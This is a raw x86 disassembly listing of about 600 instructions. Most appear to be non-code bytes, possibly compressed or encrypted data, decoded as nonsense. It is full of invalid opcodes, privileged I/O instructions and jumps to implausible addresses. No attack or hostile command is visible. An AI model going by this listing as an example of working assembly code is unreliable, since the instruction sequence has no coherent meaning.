  42d82f:	add    eax,0xfd2a7401
  42d834:	sbb    ch,dl
  42d836:	lea    edi,[ebx]
  42d838:	add    DWORD PTR [eax+0x41ca5a51],edi
  42d83e:	xchg   esi,eax
  42d83f:	add    eax,DWORD PTR [ecx]
  42d841:	add    BYTE PTR [ebx-0x688b45cf],cl
  42d847:	pusha  
  42d848:	(bad)  
  42d849:	call   0x3c94b4
  42d84e:	add    ebx,DWORD PTR [ecx]
  42d850:	and    eax,0x62d67012
  42d855:	add    DWORD PTR [edx],ebx
  42d857:	in     eax,dx
  42d858:	or     esi,0x2c4163
  42d85e:	cmp    esp,DWORD PTR [ebp+0x3d]
  42d861:	and    al,0x18
  42d863:	bound  eax,QWORD PTR [edi]
  42d865:	call   0x43fc42
  42d86a:	rcl    BYTE PTR [edi-0x22fdb31f],0x0
  42d871:	add    BYTE PTR [edi-0x6fffb247],0xb7
  42d878:	cmp    DWORD PTR [edx],edx
  42d87a:	cmp    edx,ebp
  42d87c:	je     0x42d881
  42d87e:	dec    esp
  42d87f:	inc    esi
  42d880:	aam    0x80
  42d882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d883:	mov    ecx,0x2f00000b
  42d888:	fnstenv [eax-0x7f2edfff]
  42d88e:	jl     0x42d8ef
  42d890:	stos   BYTE PTR es:[edi],al
  42d891:	stc    
  42d892:	push   cs
  42d893:	dec    edi
  42d894:	mov    bl,0xf6
  42d896:	push   esp
  42d898:	push   edi
  42d899:	jp     0x42d903
  42d89b:	mov    edx,0xd45000dc
  42d8a0:	mov    edi,0xd58b1245
  42d8a5:	mov    eax,DWORD PTR [edi+ebx*4-0x44]
  42d8a9:	mov    WORD PTR [ebx+0xdc5b],?
  42d8af:	dec    ebx
  42d8b0:	(bad)  
  42d8b1:	(bad)  
  42d8b2:	call   0x3c7955
  42d8b7:	(bad)  
  42d8b8:	fwait
  42d8b9:	jno    0x42d8fb
  42d8bb:	bound  edi,QWORD PTR [ebx]
  42d8bd:	mov    fs,WORD PTR [esi-0x74]
  42d8c0:	retf   0x32ff
  42d8c3:	or     dl,al
  42d8c5:	or     BYTE PTR [ebx+0x3e],0x8e
  42d8c9:	cs push eax
  42d8cb:	fincstp 
  42d8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d8ce:	ss xor dl,al
  42d8d1:	std    
  42d8d2:	test   DWORD PTR [edx],edi
  42d8d4:	retf   0x46b9
  42d8d7:	push   ebp
  42d8d8:	iret   
  42d8d9:	mov    dl,cl
  42d8db:	fstp   TBYTE PTR [edi-0x7]
  42d8de:	out    0x18,eax
  42d8e0:	outs   dx,DWORD PTR ds:[esi]
  42d8e1:	std    
  42d8e2:	(bad)  
  42d8e3:	jmp    0xe756b315
  42d8e8:	aaa    
  42d8e9:	add    DWORD PTR es:[eax],eax
  42d8ec:	(bad)
  42d8f1:	cmp    al,0xc1
  42d8f3:	pop    edx
  42d8f4:	mov    esp,0x1e7f2a15
  42d8f9:	add    al,bl
  42d8fb:	add    esp,DWORD PTR [edx+0x1c]
  42d8fe:	add    al,0x8d
  42d900:	sahf   
  42d901:	(bad)  
  42d902:	lock dec edi
  42d904:	jmp    0x330d756f
  42d909:	ret    0x85fd
  42d90c:	or     bh,BYTE PTR [esi]
  42d90e:	stos   BYTE PTR es:[edi],al
  42d90f:	jae    0x42d922
  42d911:	cmp    ebx,DWORD PTR [ecx]
  42d913:	and    al,0x76
  42d915:	inc    ebx
  42d916:	dec    edi
  42d917:	arpl   WORD PTR [ebx-0x3e],sp
  42d91a:	std    
  42d91b:	arpl   WORD PTR [esp+edi*2+0x1a],cx
  42d91f:	add    cl,bl
  42d921:	dec    esi
  42d922:	pushf  
  42d923:	enter  0xc270,0xfd
  42d927:	out    0xf5,al
  42d929:	inc    edx
  42d92a:	mov    eax,ds:0x36cd1143
  42d92f:	xchg   DWORD PTR [ebx+0xa847fc6],edi
  42d935:	fld1   
  42d937:	add    esp,DWORD PTR [edx+0x9]
  42d93a:	push   ss
  42d93b:	scas   eax,DWORD PTR es:[edi]
  42d93c:	ficom  DWORD PTR [esp+ecx*1]
  42d93f:	in     al,dx
  42d940:	mov    ch,al
  42d942:	fwait
  42d943:	cmc    
  42d944:	cmp    eax,0x1516ed9
  42d949:	(bad)  
  42d94b:	add    ebx,DWORD PTR [ecx]
  42d94d:	loopne 0x42d9ae
  42d94f:	in     al,dx
  42d950:	add    BYTE PTR [edx-0x27],ah
  42d953:	out    0x80,eax
  42d955:	out    0x39,al
  42d957:	jmp    0xaba53b5f
  42d95c:	out    0xb5,eax
  42d95e:	bound  ebx,QWORD PTR [edx]
  42d960:	pop    ds
  42d961:	push   eax
  42d962:	repnz out 0xd3,al
  42d965:	out    dx,al
  42d966:	pop    ss
  42d967:	lock xor ecx,DWORD PTR [edx+0x3c]
  42d96b:	mov    bh,0x3
  42d96d:	bound  edx,QWORD PTR [edi+eiz*1+0x3]
  42d971:	fist   DWORD PTR [edi+eiz*8+0x2ba76203]
  42d978:	call   0x297b236
  42d97d:	in     eax,0x15
  42d97f:	or     al,0x2c
  42d981:	test   DWORD PTR [ecx],esi
  42d983:	in     al,0xd5
  42d985:	push   0x62039b5c
  42d98a:	fnstenv [ecx-0x19f2b9b9]
  42d990:	add    bl,dh
  42d992:	dec    eax
  42d993:	out    0x3,eax
  42d995:	bound  eax,QWORD PTR [ebx-0x20]
  42d998:	and    BYTE PTR [ecx],0xf5
  42d99b:	sti    
  42d99c:	cmp    DWORD PTR [edx],esi
  42d99e:	scas   al,BYTE PTR es:[edi]
  42d99f:	cld    
  42d9a0:	das    
  42d9a1:	jo     0x42d9bc
  42d9a3:	call   0x75207b2e
  42d9a8:	pop    eax
  42d9a9:	cmp    eax,0x1003e7d8
  42d9ae:	scas   al,BYTE PTR es:[edi]
  42d9af:	add    ah,bl
  42d9b1:	and    edi,ebx
  42d9b3:	inc    eax
  42d9b4:	jmp    0x14a9d2b9
  42d9b9:	lock dec si
  42d9bd:	mov    al,ds:0xe900dbd1
  42d9c2:	call   0xe19f5f70
  42d9c7:	fld    DWORD PTR [eax]
  42d9c9:	jmp    0xe167f4b0
  42d9ce:	out    0x6c,al
  42d9d0:	mov    dl,bl
  42d9d2:	popa   
  42d9d3:	(bad)  [esi-0x3d]
  42d9d6:	popa   
  42d9d7:	aaa    
  42d9d8:	add    DWORD PTR [ecx+0x1f6e00f9],edi
  42d9de:	lock pop es
  42d9e0:	mov    BYTE PTR [ebp-0xb0635c3],ch
  42d9e6:	jge    0x42d9c7
  42d9e8:	inc    eax
  42d9e9:	jmp    0xc967f3d0
  42d9ee:	loop   0x42da54
  42d9f0:	pusha  
  42d9f1:	call   0x6293b357
  42d9f6:	and    esi,DWORD PTR [esi-0x26a1e42e]
  42d9fc:	test   ecx,esp
  42d9fe:	in     eax,0xb2
  42da00:	ja     0x42d9e3
  42da02:	xchg   BYTE PTR [ebp+0x64],ch
  42da05:	call   0x1f28b36b
  42da0a:	movd   mm0,DWORD PTR [eax+0x0]
  42da0e:	call   0xca56:0x5a3410f5
  42da15:	ret    0x562a
  42da18:	icebp  
  42da19:	adc    al,BYTE PTR [eax]
  42da1b:	clc    
  42da1c:	in     eax,0xfd
  42da1e:	push   ebx
  42da1f:	xchg   al,bl
  42da21:	add    cl,ch
  42da23:	jmp    0xd3d1214e
  42da28:	mov    dh,0xfd
  42da2a:	(bad)  
  42da2b:	clc    
  42da2c:	cdq    
  42da2d:	cmp    DWORD PTR [ebx+0x6a51c17f],ecx
  42da33:	mov    ebx,0x874687ef
  42da38:	push   ecx
  42da39:	call   0x100d:0xe1d98b2f
  42da40:	sbb    DWORD PTR ds:0x4ed9a158,esp
  42da46:	push   eax
  42da47:	and    ebp,DWORD PTR [ebp+0x29]
  42da4a:	add    BYTE PTR [ebx+0x7a6ab955],cl
  42da50:	fsubr  DWORD PTR [esi-0x72d12c25]
  42da56:	pusha  
  42da57:	dec    edx
  42da58:	fld    DWORD PTR [eax]
  42da5a:	clts   
  42da5c:	or     DWORD PTR [esi-0x18],0xfff988c8
  42da63:	cld    
  42da64:	sub    eax,DWORD PTR [ebp+0xd94a60]
  42da6a:	lss    esi,FWORD PTR [edi-0x9]
  42da6e:	jmp    FWORD PTR [edx+ecx*2]
  42da71:	ins    DWORD PTR es:[edi],dx
  42da72:	and    al,0x7
  42da74:	dec    edx
  42da75:	adc    al,0x40
  42da77:	cmp    DWORD PTR [ecx],ebx
  42da79:	add    DWORD PTR [edi-0x63],ebx
  42da7c:	cld    
  42da7d:	add    bl,0x0
  42da80:	mov    al,ds:0xb944bd56
  42da85:	mov    al,0xf9
  42da87:	imul   ecx,DWORD PTR [ebx],0xa9cb04a
  42da8d:	fld    DWORD PTR [eax]
  42da8f:	call   DWORD PTR [esi]
  42da91:	xor    DWORD PTR [eax+eax*2],ecx
  42da94:	sti    
  42da95:	push   ecx
  42da96:	rcr    DWORD PTR [ebx],1
  42da98:	or     edx,DWORD PTR [edx-0x2f]
  42da9b:	ret    
  42da9c:	inc    ebx
  42da9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da9e:	sbb    bh,BYTE PTR [edx]
  42daa0:	sbb    DWORD PTR [ebp+0x56628b54],edx
  42daa6:	test   bl,ah
  42daa8:	mov    edx,0x69079a41
  42daad:	ret    0x4efd
  42dab0:	pop    ss
  42dab1:	les    esi,FWORD PTR [edi]
  42dab3:	push   0xfffd68ca
  42dab8:	jmp    0x72576b06
  42dabd:	mov    cl,0x3d
  42dabf:	add    cl,ah
  42dac1:	xchg   esi,eax
  42dac2:	loope  0x42dadf
  42dac4:	bound  edi,QWORD PTR [edi]
  42dac6:	and    ah,BYTE PTR [edx+eax*2]
  42dac9:	ret    0x437a
  42dacc:	ds mov edx,0x4a468b7a
  42dad2:	std    
  42dad3:	jmp    DWORD PTR [edx-0x5]
  42dad6:	inc    ecx
  42dad7:	and    al,0x7a
  42dad9:	test   BYTE PTR [eax-0x7ad69dc1],0x97
  42dae0:	arpl   dx,ax
  42dae2:	std    
  42dae3:	out    0x0,eax
  42dae5:	push   ebx
  42dae6:	pop    esp
  42dae7:	(bad)  
  42dae8:	cli    
  42dae9:	jmp    0xa250a072
  42daee:	ret    0xa384
  42daf1:	xchg   BYTE PTR [esi],al
  42daf3:	(bad)  
  42daf4:	jmp    DWORD PTR [edx-0x3e]
  42daf7:	test   BYTE PTR [ebx-0xf5ba],ah
  42dafd:	(bad)  
  42daff:	add    BYTE PTR [ebx+0x44a46],0x62
  42db06:	cmp    DWORD PTR [esi-0x6d],edi
  42db09:	arpl   dx,ax
  42db0b:	std    
  42db0c:	mov    esi,ds
  42db0e:	fisttp QWORD PTR [ecx+eax*1]
  42db11:	vaesdec zmm3{k3}{z},zmm2,zmm5
  42db17:	js     0x42db19
  42db19:	(bad)  
  42db1b:	rcr    DWORD PTR [ebx-0x711826de],1
  42db21:	mov    bl,0x5f
  42db23:	fsub   QWORD PTR [edi]
  42db25:	jo     0x42db40
  42db27:	call   0xe81a9f47
  42db2c:	add    esp,edi
  42db2e:	push   esp
  42db2f:	retf   
  42db30:	arpl   WORD PTR [edx-0x27],sp
  42db33:	out    0x19,eax
  42db35:	bound  ecx,QWORD PTR [ecx]
  42db37:	jae    0x42daf0
  42db39:	out    dx,al
  42db3a:	push   esp
  42db3b:	ret    
  42db3c:	xchg   DWORD PTR [edx-0x27],esp
  42db3f:	out    0x82,eax
  42db41:	mov    eax,ds:0xd98370dc
  42db46:	(bad)  
  42db48:	add    eax,DWORD PTR [eax]
  42db4a:	out    dx,eax
  42db4b:	push   esp
  42db4c:	add    esi,DWORD PTR [ebp+esi*2-0x55]
  42db50:	out    0x33,eax
  42db52:	imul   eax,DWORD PTR [edx+0x915c3f6],0x1def0576
  42db5c:	add    al,0xc
  42db5e:	jmp    0x42db6d
  42db60:	int3   
  42db61:	adc    ebx,ebx
  42db63:	adc    eax,0x5e3a17c4
  42db68:	adc    BYTE PTR [ecx+0x19e84038],dl
  42db6e:	bound  esp,QWORD PTR [edi-0x1b]
  42db71:	sbb    cl,0xf5
  42db74:	outs   dx,DWORD PTR ds:[esi]
  42db75:	add    al,0x62
  42db77:	fcos   
  42db79:	or     DWORD PTR [ebx],ebx
  42db7b:	lods   eax,DWORD PTR ds:[esi]
  42db7c:	jmp    0x8c7d:0x4ff5a180
  42db83:	dec    ecx
  42db84:	call   0x2b9f3d8c
  42db89:	call   0x83a93bd3
  42db8e:	(bad)  
  42db8f:	(bad)  
  42db91:	and    BYTE PTR [ecx+0x647d03f5],0x61
  42db98:	add    al,ch
  42db9a:	popa   
  42db9b:	(bad)  [ebx+0x50faca25]
  42dba1:	jo     0x42dc20
  42dba3:	cmc    
  42dba4:	sub    al,0x70
  42dba6:	jne    0x42db9d
  42dba8:	sub    BYTE PTR [eax-0x73],ah
  42dbab:	cmc    
  42dbac:	xor    BYTE PTR [esi+0x934ef00],cl
  42dbb2:	je     0x42dbd9
  42dbb4:	cmc    
  42dbb5:	dec    esp
  42dbb6:	adc    ebx,DWORD PTR [esi+0x9]
  42dbb9:	cli    
  42dbba:	sahf   
  42dbbb:	loopne 0x42db53
  42dbbd:	or     al,0x5c
  42dbbf:	sbb    eax,0x91d350f5
  42dbc4:	xor    al,0x1
  42dbc6:	mov    ecx,0x292d87d4
  42dbcb:	loopne 0x42db63
  42dbcd:	or     al,0x5c
  42dbcf:	xor    eax,0xee992cf5
  42dbd4:	adc    eax,0x15e6c525
  42dbd9:	and    eax,0xd988f9c1
  42dbde:	das    
  42dbdf:	in     al,0x5c
  42dbe1:	inc    esp
  42dbe2:	int    0x2d
  42dbe4:	popa   
  42dbe5:	jge    0x42dc4c
  42dbe7:	pop    esi
  42dbe8:	fld    DWORD PTR [eax]
  42dbea:	(bad)  
  42dbeb:	clc    
  42dbec:	mov    cl,0x76
  42dbee:	sbb    esp,esp
  42dbf0:	scas   al,BYTE PTR es:[edi]
  42dbf1:	data16 icebp 
  42dbf3:	dec    ebx
  42dbf4:	fyl2xp1 
  42dbf6:	mov    ah,0x69
  42dbf8:	cs inc ebp
  42dbfa:	jmp    0xda3fa0eb
  42dbff:	mov    eax,ds:0x6aa983d9
  42dc04:	rol    cl,cl
  42dc06:	jmp    0xe9832808
  42dc0b:	js     0x42dc0f
  42dc0d:	add    eax,0xc0fa60c2
  42dc12:	add    BYTE PTR [eax],al
  42dc14:	jbe    0x42dc47
  42dc16:	push   ds
  42dc17:	test   al,0xfb
  42dc19:	aad    0x0
  42dc1b:	mov    eax,DWORD PTR [ebx]
  42dc1d:	dec    ebp
  42dc1e:	dec    ebp
  42dc1f:	cmp    eax,DWORD PTR [esp+ebx*2]
  42dc22:	jge    0x42dbe4
  42dc24:	outs   dx,BYTE PTR ds:[esi]
  42dc25:	mov    al,0x82
  42dc27:	retf   
  42dc28:	repz div dh
  42dc2b:	call   esp
  42dc2d:	pusha  
  42dc2e:	mov    ecx,0xa32a0975
  42dc33:	and    BYTE PTR [edx+0x6d0f00d5],bh
  42dc39:	pop    eax
  42dc3a:	xor    DWORD PTR [ecx],eax
  42dc3c:	mov    edx,ebp
  42dc3e:	push   0xd4e160
  42dc43:	push   0x7b
  42dc45:	loop   0x42dc97
  42dc47:	dec    DWORD PTR [esi-0x74bff62b]
  42dc4d:	pop    eax
  42dc4e:	icebp  
  42dc4f:	dec    DWORD PTR [edi+0x7a023ca7]
  42dc55:	aad    0x0
  42dc57:	je     0x42dcc9
  42dc59:	lods   al,BYTE PTR ds:[esi]
  42dc5a:	scas   eax,DWORD PTR es:[edi]
  42dc5b:	mov    edx,DWORD PTR [ebx-0x24]
  42dc5e:	add    BYTE PTR [eax],al
  42dc60:	push   eax
  42dc61:	pushf  
  42dc62:	imul   edx,DWORD PTR ds:0x2e162d0,0x6b
  42dc69:	push   esi
  42dc6a:	test   BYTE PTR [ebp+0xa1b1c7],0x4b
  42dc71:	fucomp st(0)
  42dc73:	mov    ah,0xde
  42dc75:	push   esi
  42dc76:	imul   bl
  42dc78:	add    BYTE PTR [ebp+0x22],ah
  42dc7b:	mov    es,WORD PTR [ebx+0xdc2b]
  42dc81:	shr    BYTE PTR [ecx],1
  42dc83:	xchg   esi,eax
  42dc84:	add    ebx,edi
  42dc86:	fadd   QWORD PTR ds:0xdb8784
  42dc8c:	add    BYTE PTR [edx+0x3b],ah
  42dc8f:	sbb    DWORD PTR [ebx+0x63],0x1236fdb2
  42dc96:	out    0xf9,al
  42dc98:	test   BYTE PTR [edx],ah
  42dc9a:	out    dx,eax
  42dc9b:	cmc    
  42dc9c:	xchg   BYTE PTR [ecx-0x2a10d366],ch
  42dca2:	ja     0x42dc3c
  42dca4:	xchg   ebx,eax
  42dca5:	nop
  42dca6:	imul   esi,DWORD PTR [ebp+0x4b],0xb1fcae7e
  42dcad:	mov    ds:0x6a7e823b,eax
  42dcb2:	mov    cl,0xfd
  42dcb4:	jmp    edi
  42dcb6:	jb     0x42dcc9
  42dcb8:	add    eax,0x73fcc26b
  42dcbd:	jb     0x42dcef
  42dcbf:	mov    edi,0xf19e2687
  42dcc4:	jg     0x42dc51
  42dcc6:	mov    dh,0xf
  42dcc8:	fidivr WORD PTR [ebx+0x62]
  42dccb:	(bad)  
  42dccc:	jmp    DWORD PTR [edx-0x41]
  42dccf:	push   ebx
  42dcd0:	shr    cl,0x4e
  42dcd3:	add    BYTE PTR [edi],0x63
  42dcd6:	mov    dl,0xfd
  42dcd8:	test   BYTE PTR [edi+esi*4-0x7f],ch
  42dcdc:	cmp    DWORD PTR [eax],eax
  42dcde:	arpl   WORD PTR [edx-0x22217303],si
  42dce4:	sar    bh,0x4d
  42dce7:	mov    dl,0x2d
  42dce9:	sti    
  42dcea:	int3   
  42dceb:	stos   BYTE PTR es:[edi],al
  42dcec:	mov    WORD PTR [ecx+0x66],?
  42dcef:	iret   
  42dcf0:	repnz dec DWORD PTR [edi+0x72]
  42dcf4:	std    
  42dcf5:	test   BYTE PTR [edx],ah
  42dcf7:	scas   eax,DWORD PTR es:[edi]
  42dcf8:	adc    BYTE PTR [edx],0x63
  42dcfb:	mov    dl,0xfd
  42dcfd:	icebp  
  42dcfe:	out    0x95,al
  42dd00:	mov    ecx,0xf5b215ff
  42dd05:	jae    0x42dca4
  42dd07:	fldenv [eax]
  42dd09:	add    BYTE PTR [ecx-0x7b],0xe7
  42dd0d:	add    esp,DWORD PTR [edx-0x28]
  42dd10:	jl     0x42dcd6
  42dd12:	loope  0x42dcac
  42dd14:	fiadd  DWORD PTR [eax+0x3e7d8f4]
  42dd1a:	std    
  42dd1b:	(bad)  
  42dd1c:	outs   dx,BYTE PTR ds:[esi]
  42dd1d:	jg     0x42dd14
  42dd1f:	(bad)  
  42dd21:	add    edi,DWORD PTR [edx+ebx*8]
  42dd24:	pop    esp
  42dd25:	add    BYTE PTR [ecx+0x6203e7a5],0x9
  42dd2c:	nop
  42dd2d:	sbb    eax,edi
  42dd2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd30:	xchg   edx,eax
  42dd31:	xor    ch,0x2d
  42dd34:	fnsave [eiz*8+0x62056753]
  42dd3b:	fst    DWORD PTR [edx]
  42dd3d:	pushf  
  42dd3e:	inc    ebx
  42dd3f:	cmp    BYTE PTR [edx-0x75],dh
  42dd42:	add    dh,ah
  42dd44:	pop    esp
  42dd45:	ret    
  42dd46:	mov    ecx,DWORD PTR [ebp-0x22cc1859]
  42dd4c:	xchg   esi,eax
  42dd4d:	dec    edi
  42dd4e:	rcl    BYTE PTR [edx],0xd9
  42dd51:	out    0x7e,eax
  42dd53:	ins    DWORD PTR es:[edi],dx
  42dd54:	pop    ebp
  42dd55:	dec    edx
  42dd56:	adc    DWORD PTR [edi-0x661f9452],esp
  42dd5c:	fsub   st,st(7)
  42dd5e:	add    esp,DWORD PTR [ebx-0x2a]
  42dd61:	imul   edi,DWORD PTR [ebx+0x55],0xffffffa7
  42dd65:	out    0x86,eax
  42dd67:	or     esi,edi
  42dd69:	aaa    
  42dd6a:	add    al,0x62
  42dd6c:	(bad)  
  42dd6e:	cli    
  42dd6f:	(bad)  
  42dd70:	cdq    
  42dd71:	imul   eax,esp,0x68
  42dd74:	pop    esp
  42dd75:	ins    BYTE PTR es:[edi],dx
  42dd76:	add    al,0x62
  42dd78:	fldcw  WORD PTR [esi+0x2]
  42dd7b:	mov    edx,0x6203e449
  42dd80:	push   esp
  42dd81:	add    BYTE PTR [ebp+0x2],ah
  42dd84:	push   ebx
  42dd85:	add    ebp,ecx
  42dd87:	popa   
  42dd88:	or     BYTE PTR [ebp+esi*2-0x16ff58db],cl
  42dd8f:	popa   
  42dd90:	or     BYTE PTR [esi+0x916e8a7],al
  42dd96:	and    DWORD PTR fs:[ecx],esp
  42dd99:	pop    ebp
  42dd9a:	sbb    DWORD PTR [ebx+0x4a],ebp
  42dd9d:	and    al,0x6d
  42dd9f:	(bad)  
  42dda0:	fld    DWORD PTR [eax]
  42dda2:	fs dec ebp
  42dda4:	cli    
  42dda5:	cld    
  42dda6:	jmp    0xe91c3eab
  42ddab:	sub    eax,0x72f9a3e0
  42ddb0:	rcr    DWORD PTR [ebp-0xe],1
  42ddb3:	sbb    eax,0xf9425e1c
  42ddb8:	loop   0x42de20
  42ddba:	je     0x42dd96
  42ddbc:	rcr    DWORD PTR [eax],cl
  42ddbe:	sbb    al,ch
  42ddc0:	jb     0x42ddbd
  42ddc2:	sub    DWORD PTR [ecx+0x2786d065],0x7f
  42ddc9:	loop   0x42ddf9
  42ddcb:	fistp  DWORD PTR [edi+0x2b]
  42ddce:	sbb    BYTE PTR [edx-0x4],dh
  42ddd1:	dec    ebp
  42ddd2:	(bad)  
  42ddd3:	call   0x5c441d39
  42ddd8:	in     eax,dx
  42ddd9:	stc    
  42ddda:	cld    
  42dddb:	jmp    0x5193b741
  42dde0:	test   al,0xba
  42dde2:	sti    
  42dde3:	ss aad 0x66
  42dde6:	jae    0x42ddc9
  42dde8:	xchg   ebx,eax
  42dde9:	pop    esi
  42ddea:	lds    edx,FWORD PTR [ecx]
  42ddec:	(bad)  
  42dded:	mov    dh,0xf9
  42ddef:	push   ds
  42ddf0:	mov    esp,0x233e890
  42ddf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ddf6:	stc    
  42ddf7:	pop    ss
  42ddf8:	lods   eax,DWORD PTR ds:[esi]
  42ddf9:	cli    
  42ddfa:	int3   
  42ddfb:	add    BYTE PTR [ebx],bh
  42ddfd:	fiadd  DWORD PTR [eax]
  42ddff:	add    cl,BYTE PTR [esi+eiz*1]
  42de02:	cmp    esi,edi
  42de04:	or     al,0x50
  42de06:	jp     0x42ddc4
  42de08:	daa    
  42de09:	jbe    0x42de04
  42de0b:	inc    DWORD PTR [eax]
  42de0d:	sti    
  42de0e:	fld    DWORD PTR ds:0xb958cb95
  42de14:	ja     0x1d42d63c
  42de1a:	push   eax
  42de1b:	ins    DWORD PTR es:[edi],dx
  42de1c:	and    al,0x7
  42de1e:	and    eax,0x436be8c3
  42de23:	idiv   bh
  42de25:	inc    eax
  42de26:	fs loope 0x42de73
  42de29:	or     eax,0xcce9f650
  42de2e:	dec    edi
  42de2f:	idiv   bh
  42de31:	jp     0x42de61
  42de33:	xchg   BYTE PTR [edi+ebx*1],ah
  42de36:	fld    QWORD PTR [eax]
  42de38:	add    bl,ah
  42de3a:	mov    ebp,0x5bdcfe64
  42de3f:	jne    0x42de65
  42de41:	fld    QWORD PTR [bx+di+0x3335]
  42de46:	scas   eax,DWORD PTR es:[edi]
  42de47:	cmp    DWORD PTR [eax],eax
  42de49:	xchg   edi,eax
  42de4a:	xlat   BYTE PTR ds:[ebx]
  42de4b:	cmc    
  42de4c:	je     0x42dea5
  42de4e:	stc    
  42de4f:	cmc    
  42de50:	(bad)  
  42de51:	or     cl,dl
  42de53:	and    al,0x60
  42de55:	mov    edx,ebp
  42de57:	(bad)  
  42de58:	(bad)  
  42de59:	xchg   edi,eax
  42de5a:	test   DWORD PTR [ecx-0x1],ebx
  42de5d:	inc    ebp
  42de5e:	cs inc esi
  42de60:	and    al,0x6f
  42de62:	inc    ebp
  42de63:	and    ecx,0xffffff8d
  42de66:	push   edx
  42de67:	cmp    BYTE PTR ds:0x39abb7,0xce
  42de6e:	sbb    DWORD PTR ds:0x51fb0030,esp
  42de74:	into   
  42de75:	lea    esp,[edx+0x7e]
  42de78:	fldcw  WORD PTR [edi+0x3a]
  42de7b:	adc    edx,DWORD PTR [eax+0x792e25fc]
  42de81:	and    esp,edx
  42de83:	mov    dl,0xfd
  42de85:	dec    DWORD PTR [edx]
  42de87:	pop    es
  42de88:	nop
  42de89:	cld    
  42de8a:	or     eax,0xf2238106
  42de8f:	mov    dl,0xfd
  42de91:	call   DWORD PTR [edx+0x767eb083]
  42de97:	(bad)  
  42de98:	sbb    BYTE PTR [eax],al
  42de9a:	jbe    0x42de58
  42de9c:	mov    BYTE PTR [ebx+0x3e],dh
  42de9f:	push   cs
  42dea0:	mov    cl,dl
  42dea2:	out    dx,eax
  42dea3:	fidiv  DWORD PTR ds:[edi+0x63]
  42dea7:	mov    dl,0xfd
  42dea9:	dec    edi
  42deaa:	int    0x4b
  42deac:	jl     0x42de39
  42deae:	jle    0x42ded6
  42deb0:	(bad)  
  42deb1:	jmp    DWORD PTR [edx+0x7b]
  42deb4:	jns    0x42ded9
  42deb6:	shl    BYTE PTR [ecx+0x3626fffd],cl
  42debc:	add    BYTE PTR ds:[edx+0x62004483],bh
  42dec3:	xor    eax,0xb2ca2372
  42dec8:	std    
  42dec9:	(bad)  
  42deca:	jp     0x42df37
  42decc:	and    al,0xfa
  42dece:	test   DWORD PTR [edi],esp
  42ded0:	xor    ah,BYTE PTR [esi+ebx*2]
  42ded3:	sti    
  42ded4:	cmp    DWORD PTR [eax+eax*1],esp
  42ded7:	pop    edx
  42ded8:	dec    edx
  42ded9:	cmp    BYTE PTR [edi],0x62
  42dedc:	sbb    cl,BYTE PTR [ebp+edi*1+0x5a28b262]
  42dee3:	mov    edi,0xb7e47c77
  42dee8:	out    dx,eax
  42dee9:	cs push ecx
  42deeb:	mov    cl,0x4d
  42deed:	das    
  42deee:	xchg   DWORD PTR [eax],ebp
  42def0:	fldcw  WORD PTR [esi-0x66]
  42def3:	nop
  42def4:	push   edx
  42def5:	mov    ebx,0x835265df
  42defa:	fist   WORD PTR [ecx-0x4f]
  42defd:	and    al,0xce
  42deff:	sub    BYTE PTR [esi+ebp*2+0xfa0e4bc],ah
  42df06:	inc    edi
  42df07:	dec    esi
  42df08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df09:	bnd jnp 0x42df09
  42df0c:	pop    ebp
  42df0d:	jmp    0x6203:0xe749dbf7
  42df14:	pop    esi
  42df15:	shl    edi,1
  42df17:	jmp    0x42df6a
  42df19:	out    0x3,eax
  42df1b:	bound  ecx,QWORD PTR [esi+edi*1]
  42df1e:	(bad)  
  42df1f:	lea    ecx,[edi-0x69]
  42df22:	jnp    0x42ded2
  42df24:	mov    al,0x63
  42df26:	test   eax,ebx
  42df28:	mov    ds:0xb5e69c5e,eax
  42df2d:	xor    ebx,DWORD PTR [esi]
  42df2f:	pop    ds
  42df30:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df32:	add    edi,DWORD PTR [esi]
  42df34:	std    
  42df35:	repz js 0x42df63
  42df38:	xlat   BYTE PTR ds:[ebx]
  42df39:	out    0xb6,al
  42df3b:	add    ch,al
  42df3d:	pop    ebp
  42df3e:	and    eax,0x9f506204
  42df43:	xor    DWORD PTR [esp+ebp*1+0x2c992e2f],0xa41cefcc
  42df4e:	aam    0x27
  42df50:	jo     0x42df6b
  42df52:	call   0x651780d9
  42df57:	xchg   ebx,edi
  42df59:	call   0xc98917bc
  42df5e:	mov    cl,0x51
  42df60:	sub    BYTE PTR [ecx-0x5ca77b51],dh
  42df66:	les    edi,FWORD PTR fs:[edi+0x6b9000fb]
  42df6d:	ficomp WORD PTR [eax-0x22]
  42df70:	test   DWORD PTR [ecx+0x966ae8b],edx
  42df76:	mov    WORD PTR [edi-0x43415da2],fs
  42df7c:	jno    0x42dfcf
  42df7e:	or     al,0xda
  42df80:	fmul   st(5),st
  42df82:	pop    esp
  42df83:	fbld   TBYTE PTR [ecx+0x1a257dd9]
  42df89:	mov    esp,0xf2622f04
  42df8e:	add    BYTE PTR [edx+0x21],ah
  42df91:	mov    esp,0xfd457212
  42df96:	adc    BYTE PTR [esi],bh
  42df98:	jns    0x42df22
  42df9a:	pop    edx
  42df9b:	xor    al,0x69
  42df9d:	fwait
  42df9e:	push   ebp
  42df9f:	push   0x0
  42dfa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dfa2:	(bad)  
  42dfa4:	test   BYTE PTR [edx-0x5e],dl
  42dfa7:	stc    
  42dfa8:	cli    
  42dfa9:	mov    eax,ds:0x79145aff
  42dfae:	add    BYTE PTR [eax-0x56],bl
  42dfb1:	jmp    0xe4e7c148
  42dfb6:	pop    ebx
  42dfb7:	dec    esp
  42dfb8:	lds    esi,FWORD PTR [ebp+0x61e90dba]
  42dfbe:	fldenv [esi-0x17]
  42dfc1:	fsub   st(5),st
  42dfc3:	add    BYTE PTR [ebx],dl
  42dfc5:	and    bl,cl
  42dfc7:	stc    
  42dfc8:	aam    0x9d
  42dfca:	aam    0x40
  42dfcc:	jmp    0xe6014281
  42dfd1:	popa   
  42dfd2:	or     al,0x86
  42dfd4:	push   ebp
  42dfd5:	loopne 0x42df8d
  42dfd7:	clc    
  42dfd8:	push   0xffffffcd
  42dfda:	sub    cl,BYTE PTR [ebp+edi*4-0x4bb1c573]
  42dfe1:	aaa    
  42dfe2:	push   es
